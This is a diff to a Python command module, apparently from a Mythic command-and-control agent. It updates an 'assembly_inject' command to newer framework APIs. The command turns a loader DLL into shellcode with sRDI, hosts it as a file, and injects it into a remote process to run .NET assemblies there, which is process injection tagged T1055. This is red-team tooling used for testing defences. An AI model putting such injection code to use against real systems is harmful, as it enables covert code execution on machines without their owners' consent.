@@ -1,10 +1,10 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
 from os import path
 from sRDI import ShellcodeRDI
-from MythicFileRPC import *
-
+from mythic_payloadtype_container.MythicRPC import *
+import base64
 
 class AssemblyInjectArguments(TaskArguments):
 
@@ -45,7 +45,7 @@ class AssemblyInjectCommand(CommandBase):
     needs_admin = False
     help_cmd = "assembly_inject [pid] [x64|x86] [assembly] [args]"
     description = "Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process."
-    version = 1
+    version = 2
     is_exit = False
     is_file_browse = False
     is_process_list = False
@@ -55,7 +55,7 @@ class AssemblyInjectCommand(CommandBase):
     author = "@djhohnstein"
     argument_class = AssemblyInjectArguments
     browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
-    attackmapping = []
+    attackmapping = ["T1055"]
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         arch = task.args.get_arg("arch")
@@ -64,12 +64,16 @@ class AssemblyInjectCommand(CommandBase):
         dllBytes = open(dllFile, 'rb').read()
         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), pipe_name.encode(), 0)
         task.args.add_arg("pipe_name", pipe_name)
-        resp = await MythicFileRPC(task).register_file(converted_dll)
+        resp = await MythicRPC().execute("create_file",
+                                         task_id=task.id,
+                                         file=base64.b64encode(converted_dll).decode(),
+                                         delete_after_fetch=True)
         if resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", resp.agent_file_id)
+            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
         else:
-            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")
+            raise Exception(f"Failed to host sRDI loader stub: {resp.error}")
         task.args.remove_arg("arch")
+        
         return task
 
     async def process_response(self, response: AgentResponse):
